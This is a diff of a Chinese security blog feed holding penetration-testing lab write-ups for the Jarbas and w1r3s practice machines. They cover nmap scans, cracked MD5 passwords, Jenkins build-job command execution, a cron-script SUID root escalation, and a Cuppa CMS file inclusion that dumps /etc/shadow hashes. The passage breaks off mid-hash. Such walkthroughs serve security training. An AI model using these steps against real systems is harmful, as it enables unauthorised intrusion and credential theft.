-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.147 -oA nmapscan/ports<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:42 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00025s latency).<br>Not shown: 65531 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds<br></code></pre></td></tr></table></figure>
-<p>获取更详细的版本信息</p>
-<ol type="1">
-<li>Web端是PHP5.6</li>
-<li>MariaDB存在未授权</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:45 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00028s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)<br>|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)<br>|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br>|_http-title: Jarbas - O Seu Mordomo Virtual!<br>3306/tcp open  mysql   MariaDB (unauthorized)<br>8080/tcp open  http    Jetty 9.4.z-SNAPSHOT<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds<br><br></code></pre></td></tr></table></figure>
-<h3 id="udp扫描">UDP扫描</h3>
-<p>扫描最热门的20个端口，没什么收获</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sU --top-ports <span class="hljs-number">20</span> <span class="hljs-number">192.168.80.147</span> -oA nmapscan/udp<br></code></pre></td></tr></table></figure>
-<h3 id="漏洞扫描">漏洞扫描</h3>
-<p>使用漏洞脚本扫描，也没什么收获</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p22,80,3306,8080 192.168.80.147 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
-<h2 id="mysql">MySQL</h2>
-<p>虽然提示存在未授权漏洞，但是本身设置拒绝了远程连接，因此尝试失败。</p>
-<h2 id="web服务">Web服务</h2>
-<p>访问80端口Web服务，是一个国外的网站。8080端口运行的是jekins服务。</p>
-<h3 id="目录扫描">目录扫描</h3>
-<p>查看前端发现这里不存在什么代码服务，基本都是定位到webarchive的服务，感觉是查不到什么东西。</p>
-<p>再次使用dirsearch发现存在一个access.html，存放加密的信息。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tiago</span>:<span class="hljs-number">5978</span>a<span class="hljs-number">63</span>b<span class="hljs-number">4654</span>c<span class="hljs-number">73</span>c<span class="hljs-number">60</span>fa<span class="hljs-number">24</span>f<span class="hljs-number">836386</span>d<span class="hljs-number">87</span><br><span class="hljs-attribute">trindade</span>:f<span class="hljs-number">463</span>f<span class="hljs-number">63616</span>cb<span class="hljs-number">3</span>f<span class="hljs-number">1</span>e<span class="hljs-number">81</span>ce<span class="hljs-number">46</span>b<span class="hljs-number">39</span>f<span class="hljs-number">882</span>fd<span class="hljs-number">5</span><br><span class="hljs-attribute">eder</span>:<span class="hljs-number">9</span>b<span class="hljs-number">38</span>e<span class="hljs-number">2</span>b<span class="hljs-number">1</span>e<span class="hljs-number">8</span>b<span class="hljs-number">12</span>f<span class="hljs-number">426</span>b<span class="hljs-number">0</span>d<span class="hljs-number">208</span>a<span class="hljs-number">7</span>ab<span class="hljs-number">6</span>cb<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure>
-<p>于是尝试md5 reverse</p>
-<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tiago:</span>italia99<br><span class="hljs-symbol">trindade:</span>marianna<br><span class="hljs-symbol">eder:</span>vipsu<br></code></pre></td></tr></table></figure>
-<h3 id="jenkins攻击">Jenkins攻击</h3>
-<p>将刚刚爆破出来的账号在Jenkin上测试发现，发现eder/vipsu能够顺利进入Jenkins后台。</p>
-<p>尝试Jenkins的两种RCE方式</p>
-<h4 id="脚本命令行rce">脚本命令行RCE</h4>
-<p>Jenkins 右侧系统管理 -&gt; 脚本命令行</p>
-<p>如下图，但是此种模式无法反弹shell</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022210700227.png"
-alt="image-20231022210700227" /></p>
-<h4 id="构建任务rce">构建任务RCE</h4>
-<p>选择新建任务</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211658093.png"
-alt="image-20231022211658093" /></p>
-<p>在构建这里选择<code>Execute shell</code>，在下方框中输入你需要执行的命令。</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022211844571.png"
-alt="image-20231022211844571" /></p>
-<p>输入完成之后，点击立即构建。</p>
-<p>构建结束可以在下方构建记录的地方看到相应的信息。</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212345470.png" /></p>
-<p>在构建记录的控制台完成相应的命令执行操作，可以看到构建了一个临时的shell脚本，然后执行相应的命令。</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022212853661.png"
-alt="image-20231022212853661" /></p>
-<h4 id="反弹shell">反弹shell</h4>
-<p>利用刚刚第二种创建shell脚本的方式，能够顺利反弹shell</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213700589.png"
-alt="image-20231022213700589" /></p>
-<p>顺利拿到了shell</p>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022213731270.png"
-alt="image-20231022213731270" /></p>
-<h2 id="crontab提权">Crontab提权</h2>
-<p>扫描具备suid的可执行文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
-<p>发现一个敏感服务，定时任务crontab</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/chage<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/sudo<br>/usr/bin/pkexec<br>/usr/bin/crontab<br>/usr/bin/passwd<br>/usr/sbin/pam_timestamp_check<br>/usr/sbin/unix_chkpwd<br>/usr/sbin/usernetctl<br>/usr/sbin/userhelper<br>/usr/lib/polkit-1/polkit-agent-helper-1<br>/usr/lib64/dbus-1/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure>
-<p>查看crontab任务，发现一个root权限的任务</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /etc/crontab<br></code></pre></td></tr></table></figure>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022215734691.png"
-alt="image-20231022215734691" /></p>
-<p>查看该脚本的权限，发现是777权限，则我们只需要编辑该脚本就能够以root身份执行命令。</p>
-<p>向该文件追加一行内容，使得</p>
-<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
-<p>获得root权限之后，执行如下命令，获取root权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -p<br></code></pre></td></tr></table></figure>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220716669.png"
-alt="image-20231022220716669" /></p>
-<h2 id="总结">总结</h2>
-<ol type="1">
-<li>Jenkins后台的两种RCE方式</li>
-<li>Crontab提权</li>
-</ol>
-<p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0038/image-20231022220948981.png"
-alt="image-20231022220948981" /></p>
-]]></content>
-      <categories>
-        <category>攻防实战</category>
-        <category>靶场笔记</category>
-      </categories>
-      <tags>
-        <tag>pentest</tag>
-        <tag>nmap</tag>
-        <tag>ftp</tag>
       </tags>
   </entry>
   <entry>
@@ -2904,44 +2709,93 @@ QLaaS</a>.</p>
       </tags>
   </entry>
   <entry>
-    <title>栈迁移原理图示</title>
-    <url>/2023/12/25/blog0042-%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E5%9B%BE%E7%A4%BA/</url>
-    <content><![CDATA[<p>在花式栈溢出当中，当栈溢出的长度受到限制，不足以我们布栈（x86）或者写入gadgets（x64），这时候我们就可以考虑栈迁移。</p>
+    <title>靶场笔记-w1r3s</title>
+    <url>/2023/10/22/blog0037-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-w1r3s/</url>
+    <content><![CDATA[<p>本篇涉及：nmap的精细化使用、ftp的拉取文件使用、Cuppa
+CMS攻击、shadow文件破解、sudo提权</p>
 <span id="more"></span>
-<p>栈迁移可以利用的一个重要条件，就是你能够获取到迁移后的地址。</p>
-<p>无论你是泄露了栈地址还是跳转到bss段，前提是你确定这个地址，这样你才能够跳转到这个地址去完成函数调用或者gadgets的利用。</p>
-<p>具体的利用并不是这篇文章的重点，这篇文章重点在于通过图示说明栈迁移是如何实现的。</p>
-<p>首先，我们可以知道</p>
-<ol type="1">
-<li>esp -&gt; 栈顶地址，ebp -&gt; 栈帧基地址 -&gt;
-上一个栈帧的基地址</li>
-<li>leave指令等价mov esp, ebp; pop ebp;</li>
-<li>ret指令等价pop eip</li>
-</ol>
-<p>这是一个常规的栈</p>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="主机发现">主机发现</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br></code></pre></td></tr></table></figure>
+<p>扫描结果</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-21 12:51 EDT<br>Nmap scan report for 192.168.80.1<br>Host is up (0.00011s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report for 192.168.80.2<br>Host is up (0.000099s latency).<br>MAC Address: 00:50:56:E1:27:10 (VMware)<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00058s latency).<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Nmap scan report for 192.168.80.254<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:F0:75:31 (VMware)<br>Nmap scan report for 192.168.80.128<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 1.98 seconds<br></code></pre></td></tr></table></figure>
+<p>发现存在主机192.168.80.146</p>
+<h3 id="端口扫描">端口扫描</h3>
+<h4 id="tcp扫描">TCP扫描</h4>
+<p><code>-sT</code>准确率更高，默认参数为<code>-sS</code>（SYN快速扫描）速度更快。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.146 -oA nmapscan/ports<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Nmap 7.91 scan initiated Sat Oct 21 12:58:17 2023 as: nmap -sT --min-rate 10000 -p- -oA nmapscan/ports 192.168.80.146<br>Nmap scan report for 192.168.80.146<br>Host is up (0.00052s latency).<br>Not shown: 55528 filtered ports, 10003 closed ports<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br><br>Nmap done at Sat Oct 21 12:58:29 2023 -- 1 IP address (1 host up) scanned in 12.41 seconds<br><br></code></pre></td></tr></table></figure>
+<p>获取端口服务的具体信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 将获取到的ports格式化管理</span><br>ports=$(grep open ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br><span class="hljs-meta">#</span><span class="bash"> 用默认的脚本扫描获取对应的端口版本</span><br>sudo nmap -sT -sV -sC -O 192.168.80.146 -p$ports -oA nampscan/ports_detail<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Nmap scan report for 192.168.80.146<br>Host is up (0.00034s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.80.128<br>|      Logged in as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 4<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)<br>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)<br>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>3306/tcp open  mysql   MySQL (unauthorized)<br>MAC Address: 00:0C:29:97:9F:F8 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|storage-misc<br>Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6.32 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28<br>Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (97%), Linux 3.13 - 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 4.10 (91%), Linux 4.4 (91%), Linux 2.6.32 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.8 (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 20.59 seconds<br><br></code></pre></td></tr></table></figure>
+<h4 id="udp扫描">UDP扫描</h4>
+<p>刚刚使用的TCP扫描，此处改为使用UDP扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap -sU --top-ports 20 192.168.80.146 -oA nmapscan/udp_ports<br></code></pre></td></tr></table></figure>
+<h4 id="漏洞扫描">漏洞扫描</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p21,22,80,3306 192.168.80.146 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
+<h4 id="全扫描">全扫描</h4>
+<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">sudo nmap -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.80.146</span><br></code></pre></td></tr></table></figure>
+<h2 id="ftp攻击">ftp攻击</h2>
+<h3 id="ftp信息收集">ftp信息收集</h3>
+<p>注意到ftp支持匿名登陆。</p>
+<p>ftp支持匿名登录，一般可以尝试ftp/anonymous作为用户名，空密码或者电子邮箱作为密码来进行登陆。</p>
+<p>使用ftp/空密码登录，果然进去了</p>
 <p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215029022.png"
-alt="image-20231225215029022" /></p>
-<p>执行leave之后变成如下的样子</p>
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022002909828.png"
+alt="image-20231022002909828" /></p>
+<p>全部拉取</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wget ftp://192.168.80.146:21/* --ftp-user=ftp --ftp-password=&quot;&quot; -r<br></code></pre></td></tr></table></figure>
+<p>也可以进入ftp内部拉取</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">binary // 启动二进制模式，尤其是拉取可执行文件<br>mget * // 拉取当前目录下的所有文件，不包含子目录文件<br>prompt // 关闭ftp的交互界面，拉取文件的时候不会提醒<br></code></pre></td></tr></table></figure>
+<p>拉取了文件，有一个员工名单，但是一时也看不出来存在什么问题。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">The W1R3S<span class="hljs-selector-class">.inc</span> employee list<br><br>Naomi<span class="hljs-selector-class">.W</span> - Manager<br>Hector<span class="hljs-selector-class">.A</span> - IT Dept<br>Joseph<span class="hljs-selector-class">.G</span> - Web Design<br>Albert<span class="hljs-selector-class">.O</span> - Web Design<br>Gina<span class="hljs-selector-class">.L</span> - Inventory<br>Rico<span class="hljs-selector-class">.D</span> - Human Resource<br></code></pre></td></tr></table></figure>
+<h2 id="mysql攻击">MySQL攻击</h2>
+<p>尝试远程登陆</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mysql -h 192.168.80.146 -P3306 -uroot -p<br></code></pre></td></tr></table></figure>
+<p>报错显示不允许远程登陆</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ERROR 1130 (HY000): Host &#x27;192.168.80.128&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure>
+<h2 id="http攻击">HTTP攻击</h2>
+<p>访问80端口，发现也是默认的Apache页面。</p>
+<h3 id="扫描目录">扫描目录</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python dirsearch -u http://192.168.80.146<br>sudo gobuster -u http://192.168.80.146 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <br></code></pre></td></tr></table></figure>
+<p>扫描发现存在Cuppa CMS的安装界面</p>
 <p><img
-src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0042/image-20231225215150355.png"
-alt="image-20231225215150355" /></p>
-<p>这里可以看到，我们可以使用栈溢出修改ebp的值，从而使栈帧的基地址改变。</p>
-<p>但是这样esp的值没有改变，那么进入新函数的时候重新构造栈帧，就会导致你的覆写无效（这个逻辑很显然，在我们刚学re2text的时候，你把ebp随便覆写成什么东西都不会影响system的执行）。</p>
-<p>如何修改esp呢，这里我们就重新用到了leave;ret的gadgets</p>
-<p>通过leave指令，使得我们的esp被赋值为修改后的ebp，这样我们的即便构造新栈帧，也能够实现了迁移。</p>
-<p>假设此时我们将ebp覆写至bss段，栈迁移的变化如下。</p>
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0037/image-20231022153945481.png"
+alt="image-20231022153945481" /></p>
+<p>尝试搜索Cuppa CMS的历史漏洞，这里发现存在确实存在 : <a
+href="https://www.exploit-db.com/exploits/25971">Cuppa
+CMS文件包含</a></p>
+<p>通过文件包含读取到<code>/etc/shadow</code>文件</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$vYcecPCy$JNbK.hr<span class="hljs-number">7</span>HU<span class="hljs-number">72</span>ifLxmjpIP<span class="hljs-number">9</span>kTcx./ak<span class="hljs-number">2</span>MM<span class="hljs-number">3</span>lBs.Ouiu<span class="hljs-number">0</span>mENav<span class="hljs-number">72</span>TfQIs<span class="hljs-number">8</span>h<span class="hljs-number">1</span>jPm<span class="hljs-number">2</span>rwRFqd<span class="hljs-number">87</span>HDC<span class="hljs-number">0</span>pi<span class="hljs-number">7</span>gn<span class="hljs-number">9</span>t<span class="hljs-number">7</span>VgZ<span class="hljs-number">0</span>:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">bin</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sys</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sync</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">games</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">man</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mail</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">news</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uucp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">proxy</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">www</span>-data:$<span class="hljs-number">6</span>$<span class="hljs-number">8</span>JMxE<span class="hljs-number">7</span>l<span class="hljs-number">0</span>$yQ<span class="hljs-number">16</span>jM..ZsFxpoGue<span class="hljs-number">8</span>/<span class="hljs-number">0</span>LBUnTas<span class="hljs-number">23</span>zaOqg<span class="hljs-number">2</span>Da<span class="hljs-number">47</span>vmykGTANfutzM<span class="hljs-number">8</span>MuFidtb<span class="hljs-number">0</span>..Zk.TUKDoDAVRCoXiZAH.Ud<span class="hljs-number">1</span>:<span class="hljs-number">17560</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">backup</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">list</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">irc</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">gnats</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">nobody</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-timesync:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-network:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-resolve:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-bus-proxy:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">syslog</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">_apt</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">messagebus</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uuidd</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lightdm</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">whoopsie</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>-autoipd:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">dnsmasq</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">colord</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">speech</span>-dispatcher:!:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">hplip</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">kernoops</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">pulse</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">rtkit</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">saned</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">usbmux</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">w1r3s</span>:$<span class="hljs-number">6</span>$xe/eyoTx$gttdIYrxrstpJP<span class="hljs-number">97</span>hWqttvc<span class="hljs-number">5</span>cGzDNyMb<span class="hljs-number">0</span>vSuppux<span class="hljs-number">4</span>f<span class="hljs-number">2</span>CcBv<span class="hljs-number">3</span>FwOt<span class="hljs-number">2</span>P<span class="hljs-number">1</span>GFLjZdNqjwRuP<span class="hljs-number">3</span>eUjkgb/io<span class="hljs-number">7</span>x<span class="hljs-number">9</span>q<span class="hljs-number">1</span>iP.:<span 